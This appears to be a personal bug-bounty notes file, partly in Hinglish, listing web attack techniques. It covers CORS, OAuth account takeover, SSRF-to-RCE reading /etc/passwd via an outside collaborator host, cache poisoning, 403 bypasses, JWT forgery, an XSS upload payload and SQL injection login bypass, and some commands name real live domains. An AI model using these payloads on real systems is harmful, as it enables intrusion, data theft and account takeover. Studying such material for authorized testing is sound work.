@@ -1,0 +1,203 @@
+Special and Simple Bugs : required just enumeration of the web app:
+CORS: in normal get request set Origin: https://evil.com {if there is no origin header then add it manually} , now if the server reflect: Access-Control-Allow-Origin: https://evil.com , then site is vulnerable with CORS [agar Access-COntrol-Allow-Credentials: true hai tab bhi site vulnerable hai]
+authentication:
+                 Sign Up:
+                 * email verfication can be bypassed , fill registration form , and capture server response , email_verfied: False , set it to true
+                 * if the web app has a  OAUTH feature then check sometimes what happen, we can create a account with a simple name ,email , password and other details, now what we have to do create an account with victim email and do not do authentication ,now when victim create an account with the OAuth third party apps then victim will directly login and in case of OAuth no requriment of setting the password so now you can login to victim account any time with the email and password that you set before victim create the account using OAuth
+                 Sign In:
+                 * no rate limit is set , because of that attacker can do brute force attack and take over the other user account completely
+                      Two Factor Authentication:
+                       * no rate limit is set , because of that attacker can do brute force on OTP parameter...
+                       
+  
+OAUTH: 
+        in case Authorization code flow grant ( issemein authorization server pehle ek , autorization code deta hai, jisse phir authorization server ko bhejne par authorization token generate hota hai ): check it reusability , if it is generating multiple autorization token then it is vulnerable, check if the autorization token can be reused or not [ mtlb exprire autorization token se dobara se session cookie generate kr rahi hai ya nahi ,agar kr rahi hai toh woh vulnerable hai ] 
+        URL redirection : jab bhi hum sign up with google par click krenge toh redirect_url parameter ko attacker site se change krke deklo 
+                       
+HTTP request Smuggling: 
+                      key points:  \n = 1byte \r = 1byte , har request ki har line ki ending mein \r\n ka combination hota hai jo ki hidden hota hai isslye har line ki end mein 2bytes hamesha jodna chyein:
+                      content length : simple decimal numbers
+                      Transfer-Encoding: hexadecimal number
+Dos attack:
+         No length limit on password or any other field 
+         refrence : https://hackerone.com/reports/738569
+         No rate limiting on sending reset password otp or links to any user 
+         refrence : https://hackerone.com/reports/751604
+Search field attack: 
+               GET request: go to tools -> BruteXSS-1 -> and launch script select the wordlist2.txt
+Reflected Attack on Login and Registration form:
+               Check Source code if web page is storing the input or not, if there is not filteration of inputs then reflected xss might be possible
+Attack on Password Reset Link:
+                            DOs, email spam etc
+                            if it is including website host header then what we can do we can tr to change it
+ClickJacking AttacK:
+                   how to test: copy url and test it on https://clickjacker.io/  (this is caused because of X-Frame-Options header missing which decide on which domain your website should open) NOTE: some browser still not support X-Frame-otion header
+Informative : Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'   , how to detect : curl -I https://www.udemy.com | grep 'script-src'  , here unsafe-inline is not a good thing https://hackerone.com/reports/513105  https://hackerone.com/reports/225833
+
+HEADERS WHICH WE CAN ADD FOR REFLECTION ,REDIRECTION:
+                                 X-Forwarded-Host: canary
+                                 X-Host: portswigger-labs.net
+                                 X-Forwarded-Server: canary
+                                 X-Forwarded-Scheme: nothttps
+                                 X-Original-URL: /admin
+OPTIONS header enable : this is also a vulnearbility : https://hackerone.com/reports/8184  , https://hackerone.com/reports/36409 , how to check : https://www.hackingarticles.in/multiple-ways-to-detect-http-options/  
+                          or use following commands: nikto -h target
+                                                     curl -v -X OPTIONS target or use : nmap --script http-methods domain
+Server Response Manuplation: manuplating server response might lead to an big attack
+Overwriting data on server : https://hackerone.com/reports/258201
+
+The site uses SSL and the Strict-Transport-Security HTTP header is set with max-age=0  : how to find nikto -h target
+
+HSTS is not enabled : curl -s -D- https://example.com/ | grep -i Strict   , refrence : https://hackerone.com/reports/7969
+
+PUT method is allowed: this is high serverity vlunerability , How to check: davtest -url target or you can use : nikto -h target  or you can send this request:
+                          PUT /test.html HTTP/1.1
+                          Host: testing-website
+
+                          <html>
+                          HTTP PUT Method is Enabled
+                          </html>
+                          
+                          If the server response with 2XX success codes or 3XX redirections and then confirm by GET request for test.html file. The application is vulnerable.
+Delete Method is allowed: how to check: 
+                          DELETE /resource.html HTTP/1.1
+                          Host: www.example.com
+                          ----
+                          
+                          for more info check : https://github.com/OWASP/www-project-web-security-testing-guide/blob/master/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods.md
+Trace method is enable: https://owasp.org/www-community/attacks/Cross_Site_Tracing  (High Severity can lead to Cookie set check the page)
+                    how to check : first by nmap
+                    curl -vX TRACE  https://mg3.investnext.com/ 
+                    curl -vX TRACE  -H "Viraj: Viraj=value" https://mg3.investnext.com/
+Broken Authentication: https://hackerone.com/reports/23921
+                       https://hackerone.com/reports/634488
+file Upload Bypass through : svg file upload , exiftool: exiftool -Comment="\"><script>alert(prompt('XSS BY ZEROX4'))</script>" xss_comment_exif_metadata_double_quote.png
+                           tricks: Beacon.html%00.pdf , beacon.html.pdf
+https://hackerone.com/reports/964550
+       
+       HOW WEB CACHE OCCUR: if a request is going to cache , then it has two things key headers and paramerets and UNkeyed headers and parameters, keyed ke basis pe yein decide hota hai ki isse cache krne ki permission hai ya nahi, and unkeyed mein changes krne par agar woh changes responsemein bhi reflect ho ya usse bhi change krrde toh aab naya response cache server mein store hojata hai https://cpdos.org/
+       
+       Detection of Web CACHE POISONING:
+         copy target url:
+         open two terminals:
+         Terminal 1)               while true; do wget "TARGET_URL" --header 'X-Forwarded-Host: cyberjutsu.io/#' -qO->/dev/null; echo "poisoning...";done               
+         
+         Terminal 2)                 while true; do wget "TARGET_URL" -qO-|grep "cyberjutsu.io"; echo "ping my payload..." ;done
+         
+         if the reflection was found then web cache poisoing is possible
+         
+ WEB CACHE DECEPTION:  cache mein sirf non sensitive information hi store hoti hai ,like public images ,css , js ,php files but kabhi bhi , PROFILE ya user sensitive information store nahi hoti, agar hum user sensitive information kisi aur extenion se store kr de cache mein toh sirf URL ke through bhi kisi ki information nikali ja sakti hai....
+                                      HOW TO DO: if https://domain/userprofile is not chaching on server                      || har request ke baad hamesha age:0 hi bana rah raha hai toh it is not cacheing at all
+                                      now if https://domain/userprofile/notexestence.css  ko krne par kuch server, userprofile hi dikhayenge and notexetence.css ko ignore kr denge  || esa mein har ek single request ke baad age badhta hi jaye toh smjh jao , https://domain/userprofile/nonexestence.css cache ho gaya and now koi bhi isse access kr sakta hai sirf URL ke saath
+                                      
+           SSRF: 
+                  did this three commands for ssrf if you don't have all subdomains
+                     gau -subs latoken.com; subfinder -d latoken.com -silent |waybackurls | gf ssrf | sort -u >> testblinkssrf.txt
+                     cat testblinkssrf.txt | qsreplace "http://vcbm7glftmy2yh2ysw99yrejlar0fp.burpcollaborator.net" >> ssrfuzz.txt
+                     ffuf -c -w ssrfuzz.txt -u FUZZ -t 200
+           SSRF to RCE => 
+           suppose you get ssrf in a url then => at last of burp collaborator link add ?`whoami` or ?`cat${IFS}/etc/passwd` and check coming request in burp suite may be you will found some rce
+ AWS detection: how to check that domain is using s3 or not : 
+ simple go to lazys3 tool : ruby lazys3 yahoo.com
+Text Injection [suppose if a url is showing cannot GET / instead of 404 , means and if put and word in url which is reflecting then we can exploit it , 
+https://example.com 
+cannot GET  /
+https://example.com/hello
+cannot GET /hello
+exploit:  https://example.com////example.com__has__been__moved__TO__[ attacker.com ]__Welcome_coupon_is_availabe_go_for_it
+cannot GET /example.com__has__been__moved__TO__[ attacker.com ]__Welcome_coupon_is_availabe_go_for_it
+
+]
+
+Bypass 403:  1) BY URL manipulation , like adding ?.css , .php.jpeg , /viraj etc
+             2) BY USing different HTTP Methods , Like instead of GET use POST request with Content-Length: 0 or curl -H "Content-Length: 0" -X POST URL
+             3) By using extra slashes: https://example.com/wp-json/wp/v2/user => 403 Forbidden :::: https://example.com/wp-json/wp/v2//user => 200 
+             && https://example.com/login.php?action=lostpassword => 403 Forbidden :::: https://example.com/login.php/?action=lostpassword => 200
+             4) if https://example.com/admin = > 403 and https://example.com/user => 200 :::: then GET /user X-Original-URL: /admin or X-Override-URL: /admin or X-Rewrite-URL: /admin
+             5) by trying different Payload:
+             /accessible/..;/admin
+             /.;/admin
+             /admin;/
+             /admin/~
+             /./admin/./
+             /admin?param
+             /%2e/admin
+             /admin#
+             //admin//
+             /admin.../
+             //admin.../
+             /./admin/
+             /admin/.
+             /admin%20/
+             /%20admin%20/
+             /%20admin%20/
+             admin%20/page
+             6)
+             POST /xmlrpc
+             Response: 403
+             attack:
+                   POST /
+                   X-Original-URL: /xmlrpc
+                   Response: 200
+             you can also use: X-Override-URL ,X-Rewrite-URL
+
+
+
+HIDDEN GET PARAMETER Finder: 
+         use this simple command , and just change the domain , there is nothing more to change 
+         assetfinder example.com | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'); echo -e "\e[1;33m$url\n\e[1;32m$vars"; done
+         
+OPEN Redirect url finder: from the list of urls
+           cat url-list.txt | gf redirects
+
+
+## JWT
+              JWT token bypass
+              By @HackerHumble
+              Source: link1, link2, link3
+
+              Here are 3 tips to bypass JWT token authentication.
+
+              Tip #1:
+
+              Capture the JWT.
+              Change the algorithm to None.
+              Change the content of the claims in the body with whatever you want e.g.: email: attacker@gmail.com
+              Send the request with the modified token and check the result.
+              Tip #2:
+
+              Capture the JWT token.
+              If the algorithm is RS256 change to HS256 and sign the token with the public key (which you can get by visiting jwks Uri / mostly it will be the public key from the site’s https certificate)
+              Send the request with the modified token and check the response.
+              You can party with the bounty if the backend doesn’t have the algorithm check.
+              Tip #3: Check for proper server-side session termination (OTG-SESS-006):
+
+              Check if the application is using JWT tokens for authentication.
+              If so, login to the application and capture the token. (Mostly web apps stores the token in the local storage of the browser)
+              Now logout of the application.
+              Now make a request to the privileged endpoint with the token captured earlier.
+              Sometimes, the request will be successful as the web apps just delete the token from browser and won’t blacklist the tokens in the backend.
+Easy information disclosure with httpx
+   cat hosts.txt | httpx -path /server-status?full=true -status-code -content-length
+   cat hosts.txt | httpx -ports 80,443,8009,8080,8081,8090,8180,8443 -path /web-console/ -status-code -content-length
+   cat hosts.txt | httpx -path /phpinfo.php -status-code -content-length -title
+
+Fuctionalities Attack => 
+   Forget Password => 
+             https://www.infosecmatter.com/bug-bounty-tips-7-sep-27/#8_easy_information_disclosure_with_httpx  => also read sql injection via email on this page
+             
+Google Dorking = >
+      inurl:login site:evil.com
+      site:evil.com
+      inurl:login site:evil.com -"User Login"    = > public user login file dorks hata dega jinnme "User Login" likha hai
+      
+SQL injection techinque =>
+
+   Finding number of fields (or column) => for this best command is UNION => id=23 is param then => id=23' UNION SELECT 'test1'; -- - => gives sql error => id=23' UNION SELECT 'test1','test2'; -- - => again error => id=23' UNION SELECT 'test1','test2','test3'; -- - => no error => abb page pr + source code mein check kro ki test1,test2,test3,test4 mein se kuch bhi reflect ho raha hai ya nahi , agar kuch reflect ho raha hai toh hum usski jagah user() put krke reflection wali jagah pr username dekh sakte hai otherwise blind sql injection hi kro ya sqlmap use kro
+   
+   suppose we are on login page the we can assume query on server is like => 
+      SELECT password FROM users WHERE username='user_name_given_by_us_on_the_login_page'  => if username not found then wrong credentials or if exist then this query will return the password stored in the table. 
+      now what we can do is  => putting user_name_given_by_us_on_the_login_page' UNION SELECT 'playerx' AS password WHERE '1'='   in username field and playerx in password field => 
+      SELECT password FROM users WHERE username='user_name_given_by_us_on_the_login_page' UNION SELECT 'playerx' AS password WHERE '1'='1'  = >   login will bypass
+      
+      what happen here the password from the table is selected as playerx means the password will be playerx for this particular check , password will not change in the table but will playerx will be used as password for this time. => note=> password must be stored as a plain text in the table
